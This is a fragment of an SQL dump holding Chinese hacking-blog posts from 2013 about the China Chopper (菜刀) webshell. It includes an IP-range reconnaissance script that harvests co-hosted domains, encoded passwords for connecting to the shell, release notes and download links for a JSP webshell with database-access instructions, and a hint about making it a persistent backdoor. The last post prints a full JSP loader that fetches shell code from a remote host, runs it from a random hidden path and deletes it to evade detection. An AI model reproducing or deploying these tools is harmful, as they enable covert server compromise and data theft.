class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">package net.ltan.bbs.util;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\npublic class DomainUtil {\n        static Pattern urlMatcher = Pattern.compile(&quot;(http|ftp|https):\\\\/\\\\/[\\\\w\\\\-_]+(\\\\.[\\\\w\\\\-_]+)+([\\\\w\\\\-\\\\.,@?^=%&amp;:/~\\\\+#]*[\\\\w\\\\-\\\\@?^=%&amp;/~\\\\+#])?&quot;);// 抓网址\n        /**\n         * 返回c段Ip list\n         * \n         * @param s\n         * @param e\n         * @return\n         */\n        public static List&lt;String&gt; createCIp(String s, String e) {\n                String[] sarr = s.split(&quot;\\\\.&quot;);\n                String[] earr = e.split(&quot;\\\\.&quot;);\n                List&lt;String&gt; ip = new ArrayList&lt;String&gt;();\n                if (Integer.parseInt(earr[2]) - Integer.parseInt(sarr[2]) &gt; -1) {\n                        for (int i = Integer.parseInt(sarr[2]); i &lt; Integer\n                                        .parseInt(earr[2]) + 1; i++) {\n                                for (int j = 1; j &lt; 256; j++) {\n                                        // ip.add(sarr[0]+&quot;.&quot;+sarr[1]+&quot;.&quot;+i+&quot;.&quot;+j);\n                                        System.out.println(&quot;http://sameip.org/ip/&quot; + sarr[0] + &quot;.&quot;+ sarr[1] + &quot;.&quot; + i + &quot;.&quot; + j);\n                                        getDomain(SendHttpRequest.sendGetRequest(&quot;http://sameip.org/ip/&quot; + sarr[0]+ &quot;.&quot; + sarr[1] + &quot;.&quot; + i + &quot;.&quot; + j));\n                                }\n                        }\n                }\n                return ip;\n        }\n        public static void get(){\n                getDomain(SendHttpRequest.sendGetRequest(&quot;http://sameip.org/ip/vip.qq.com&quot;));\n        }\n        public static void getDomain(String sourceCode) {\n                String urlS = &quot;&lt;table cellspacing=\\&quot;1\\&quot; width=\\&quot;100%\\&quot;&gt;&quot;;\n                if (sourceCode.indexOf(urlS) != -1) {\n                        String urlE = &quot;&lt;/table&gt;&quot;;\n                        sourceCode = sourceCode.substring(sourceCode.indexOf(urlS)+ urlS.length(), sourceCode.indexOf(urlE));\n                        Matcher matcher = urlMatcher.matcher(sourceCode);\n                        while(matcher.find()){\n                                System.out.println(matcher.group());\n                        }\n                }\n        }\n        public static void main(String[] args) {\n                List&lt;String&gt; ip = createCIp(&quot;113.10.245.23&quot;, &quot;113.10.245.23&quot;);\n                for (int i = 0; i &lt; ip.size(); i++) {\n                        System.out.println(ip.get(i));\n                }\n//                get();\n        }\n}</pre>', null, '2013-11-28 15:07:00', '1', '538', null, '0', '2014-04-15 14:43:35'), ('78', '1', '10', 'VB、C++、C#、Java连接菜刀db.mdb数据库', '园长', 'VB连接菜刀：<br />\n<br />\n<pre class=\"brush:vb;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n&quot;密&quot;&amp;chr(13)&amp;chr(9)&amp;chr(10)&amp;&quot;码&quot;&amp;chr(2)\n</pre>\n<br />\n<p>C++连接菜刀：<br /></p>\n<br />\n<pre class=\"brush:cpp;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nbyte pwd[]={0xc3,0xdc,0x0d,0x09,0x0a,0xc2,0xeb,0x02};(char*)pwd\n</pre>\n<br />\n<p>C#连接菜刀：<br /></p>\n<br />\n<pre class=\"brush:csharp;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nEncoding.GetEncoding(936).GetString(new byte[]{0xc3,0xdc,0x0d,0x09,0x0a,0xc2,0xeb,0x02})\n</pre>\n<br />\n<p>Java连接菜刀：:<br /></p>\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nnew byte[]{(byte) 0xc3,(byte) 0xdc,0x0d,0x09,0x0a,(byte) 0xc2,(byte) 0xeb,0x02}\n</pre>', null, '2013-11-28 15:10:19', '1', '534', null, '0', '2013-11-28 15:10:19'), ('80', '1', '12', '菜刀Jsp脚本最终更新版', '园长', '<pre style=\"word-wrap: break-word; white-space: pre-wrap; \">\n<b style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">脚本下载地址：\nJSP脚本：http://xsser.me/caidao/css.jsp\nJspx脚本：http://xsser.me/caidao/jspx.jspx\nJspf脚本：http://xsser.me/caidao/css.jspf</b></pre>\n<br />\n<p><b style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">详情：http://xsser.me/caidao/1.txt<br /></p>\n<br />\n<p>修复上一版BUG：</b><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">&nbsp;</span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><code style=\"margin: 0px auto; padding: 4px 8px; display: block; font-family: \'Lucida Console\', \'Courier New\', Courier, mono, monospace; font-size: 12px; color: rgb(51, 51, 51); background-color: rgb(248, 248, 248); border: 1px solid rgb(204, 204, 204); line-height: 18px; overflow: auto; word-wrap: break-word; \">1、修复Oracle无setCatalog的BUG。&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>2、修复菜刀中一切中文乱码问题(包括查询、文件路径、文件内容、SQL导出的文件内容、文件上传等)。&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n3、修复500错误Tomcat爆出密码问题。</code><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" />\n<p><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><b style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">功能增改：</b><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">&nbsp;</span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><code style=\"margin: 0px auto; padding: 4px 8px; display: block; font-family: \'Lucida Console\', \'Courier New\', Courier, mono, monospace; font-size: 12px; color: rgb(51, 51, 51); background-color: rgb(248, 248, 248); border: 1px solid rgb(204, 204, 204); line-height: 18px; overflow: auto; word-wrap: break-word; \">1、新增查询参数：--f:-to:&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>select * from sys_user --f:-to:d:/1.txt&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>select * from sys_user --f:1.txt （--f参数依旧支持）&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>-to:后面跟的是要保存的绝对路径&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n2、修改数据库连接方式</code><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" />\n<p><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><b style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">其他问题</b><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">&nbsp;</span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><code style=\"margin: 0px auto; padding: 4px 8px; display: block; font-family: \'Lucida Console\', \'Courier New\', Courier, mono, monospace; font-size: 12px; color: rgb(51, 51, 51); background-color: rgb(248, 248, 248); border: 1px solid rgb(204, 204, 204); line-height: 18px; overflow: auto; word-wrap: break-word; \">1、菜刀上传功能在新版本的客户端并未传参，所以新版本<b style=\"margin: 0px; padding: 0px; \">无法上传文件</b>(可修复，懒得改，如果想用文件上传功能自行找老版本)。&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>2、菜刀编码问题需要在连接Shell的时候指定编码，这里的编码是全局性的。&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n3、菜刀新脚本默认编码是UTF-8只不针对菜刀客户端，浏览器Web请求可用。</code><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" />\n<p><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><b style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">连接数据库问题：</b><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">&nbsp;</span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">1、修改了数据库连接方式如Oracle连接方式改为：&nbsp;</span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><code style=\"margin: 0px auto; padding: 4px 8px; display: block; font-family: \'Lucida Console\', \'Courier New\', Courier, mono, monospace; font-size: 12px; color: rgb(51, 51, 51); background-color: rgb(248, 248, 248); border: 1px solid rgb(204, 204, 204); line-height: 18px; overflow: auto; word-wrap: break-word; \">&lt;T&gt;XDB&lt;/T&gt;&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>&lt;X&gt;&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>oracle.jdbc.driver.OracleDriver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:oracle:thin:@localhost:1521&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>scott&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>woshimima&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>orcl&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>&lt;/X&gt;&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:oracle:thin:@localhost:1521是对应版本的Oracle的URL地址。localhost替换成目标IP、1521是默认Oracle端口。&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>scott是用户名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>woshimima是数据库密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>orcl是数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><b style=\"margin: 0px; padding: 0px; \">其中帐号或密码可以为空的表示方式必须是:[/null]</b>&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>如Mysql空密码连接示例：&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>&lt;T&gt;XDB&lt;/T&gt;&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>&lt;X&gt;&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>com.mysql.jdbc.Driver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:mysql://localhost/test&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>root&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>[/null]&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>&lt;/X&gt;&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><b style=\"margin: 0px; padding: 0px; \">[/null]表示空密码</b>&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:mysql://localhost/test当中的test是数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>其他数据库连接方式：&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>&lt;T&gt;XDB&lt;/T&gt;&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>&lt;X&gt;&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>com.microsoft.sqlserver.jdbc.SQLServerDriver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:sqlserver://192.168.1.132:1433;databaseName=test&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>sa&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>woshimima&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>&lt;/X&gt;&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>databaseName=test是对应的数据名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>sa是帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\nwoshimima是数据库密码</code><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" />\n<p><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">连接任意数据库：&nbsp;</span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><code style=\"margin: 0px auto; padding: 4px 8px; display: block; font-family: \'Lucida Console\', \'Courier New\', Courier, mono, monospace; font-size: 12px; color: rgb(51, 51, 51); background-color: rgb(248, 248, 248); border: 1px solid rgb(204, 204, 204); line-height: 18px; overflow: auto; word-wrap: break-word; \">ORACLE：&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>oracle.jdbc.driver.OracleDriver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:oracle:thin:@主机地址:端口&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>MSSQL2000：&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>com.microsoft.jdbc.sqlserver.SQLServerDriver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:microsoft:sqlserver://主机地址:端口;databasename=数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>MSSQL2005：&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>com.microsoft.sqlserver.jdbc.SQLServerDriver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:sqlserver://主机地址:端口;databaseName==数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>MYSQL:&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>com.mysql.jdbc.Driver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:mysql://主机地址:端口/数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>Db2:&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>com.ibm.db2.jcc.DB2Driver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:db2://主机地址:端口/数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>Informix：&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>com.informix.jdbc.IfxDriver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:informix-sqli://主机地址:端口/数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>Sybase2:&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>com.sybase.jdbc2.jdbc.SybDriver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:sybase:Tds:主机地址:端口?ServiceName=数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>Sybase3：&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>com.sybase.jdbc3.jdbc.SybDriver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:sybase:Tds:主机地址:端口?ServiceName=数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>PostgreSQL:&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>org.postgresql.Driver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:postgresql://主机地址:端口/数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>Teradata：&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>com.ncr.teradata.TeraDriver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:teradata://主机地址:端口/数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>Netezza:&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>org.netezza.Driver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:netezza://主机地址:端口/数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>密码&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>JTDS驱动连接MSSQL:&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>net.sourceforge.jtds.jdbc.Driver&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>jdbc:jtds:sqlserver://主机地址:端口/数据库名&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>帐号&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n密码</code><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" />\n<p><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><a href=\"http://pan.baidu.com/s/1DsU7d\" style=\"margin: 0px; padding: 0px; color: rgb(0, 46, 140); text-decoration: none; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" target=\"_blank\">版本下载</a><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">&nbsp;</span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><b style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">其他：</b><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \">&nbsp;</span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255); \" /></p>\n<p><code style=\"margin: 0px auto; padding: 4px 8px; display: block; font-family: \'Lucida Console\', \'Courier New\', Courier, mono, monospace; font-size: 12px; color: rgb(51, 51, 51); background-color: rgb(248, 248, 248); border: 1px solid rgb(204, 204, 204); line-height: 18px; overflow: auto; word-wrap: break-word; \">1、菜刀jsp脚本更新版.jsp为最新压缩包、菜刀jsp脚本文明版.jsp默认注视掉了写文件功能，菜刀jsp脚本无压缩版.jsp是直接把代码格式化后的效果、Chropper.java是Servlet版本。&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>2、关于功能问题，做得太强大了某些便宜会觉得不应该所以这个版本并不是最强大的版本，那样的版本也不会放出来。&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n<p>3、<b style=\"margin: 0px; padding: 0px; \">菜刀jsp永久后门</b>实现这个功能在通过修改Chropper.java为Filter然后修改服务器某部分配置即可实现，有需求的同学自行修改。&nbsp;<br style=\"margin: 0px; padding: 0px; \" /></p>\n4、如果有其他BUG，后面就直接在这帖内说明，不再发版本。</code><br />', null, '2013-11-28 15:13:18', '1', '696', null, '0', '2013-11-28 15:13:18'), ('82', '1', '12', 'JavaWeb随机后门?', '园长', '<span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: #ffffff;\">我的思路是先从远程读取要生成的shell内容，然后把shell藏在WEB-INF下shell的名字和长度也都随机生成。比如：\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/11/1.jpg\"><img class=\"alignnone size-full wp-image-1134\" alt=\"1\" src=\"http://javaweb.org/wp-content/uploads/2013/11/1.jpg\" width=\"728\" height=\"120\" /></a></p>\n<p></span></p>\n<p><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: #ffffff;\">不过就算藏在WEB-INF下也会被发现，干脆用一次就删一次？这样不会在任何目录下留下Shell。</span></p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/11/2.jpg\"><img class=\"alignnone size-full wp-image-1135\" alt=\"2\" src=\"http://javaweb.org/wp-content/uploads/2013/11/2.jpg\" width=\"984\" height=\"527\" /></a></p>\n<p><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: #ffffff;\">菜刀链接：http://localhost/Demo2/new.jsp?url=http://xsser.me/caidao/css.jsp </span></p>\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">&lt;%@ page language=&quot;java&quot; import=&quot;java.io.*,java.net.*,java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt; \n&lt;%! \n  String getConnection(String url) { \n    String result=&quot;&quot;,line=&quot;&quot;; \n    try { \n      URL realUrl = new URL(url); \n      URLConnection connection = realUrl.openConnection(); \n      connection.setConnectTimeout(15000); \n      connection.setReadTimeout(15000); \n      connection.connect(); \n      BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream())); \n      while ((line = in.readLine()) != null) { \n        result += line; \n      } \n    } catch (Exception e) { \n      e.printStackTrace(); \n    } \n    return result; \n  } \n  void writeShell(String url,String path){ \n    try{ \n      RandomAccessFile rf = new RandomAccessFile(path, &quot;rw&quot;); \n      rf.write(new String(getConnection(url)).getBytes()); \n      rf.close(); \n    }catch(Exception e){ \n      e.printStackTrace(); \n    } \n  } \n  String getRandomString(int length) { \n      String base = &quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;; \n      Random random = new Random();   \n      StringBuffer sb = new StringBuffer();   \n      for (int i = 0; i &lt; length; i++) {   \n          int number = random.nextInt(base.length());   \n          sb.append(base.charAt(number));   \n      }   \n      return sb.toString();   \n   } \n  String getRequestFile(HttpServletRequest request){ \n    return &quot;/WEB-INF/classes/&quot;+getRandomString(new Random().nextInt(10)+1)+&quot;.jsp&quot;; \n  } \n%&gt; \n&lt;% \n  String f = getRequestFile(request),p = request.getSession().getServletContext().getRealPath(&quot;/&quot;)+f; \n  writeShell(request.getParameter(&quot;url&quot;),p); \n  request.getRequestDispatcher(f).forward(request,response); \n  new File(p).delete(); \n%&gt;</pre>\n<p><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: #ffffff;\">测试的时候还发现了一个jspx和jsp的一个小秘密： </span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: #ffffff;\" /></p>\n<p><b style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: #ffffff;\">用jspx的语法可以直接适用于jsp，也就是说可以把http://xsser.me/caidao/jspx.jspx的内容copy，然后保存到一个jsp文件里面一样可以正常访问。</b><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: #ffffff;\"> </span><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: #ffffff;\" /></p>\n<p><br style=\"margin: 0px; padding: 0px; font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: #ffffff;\" /></p>\n<p><span style=\"font-family: Verdana, \'Microsoft YaHei\', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 22px; background-color: #ffffff;\">现在要做的就是怎么去藏生成后门的代码了。</span></p>', null, '2013-11-28 15:15:42', '1', '547', null, '0', '2014-04-15 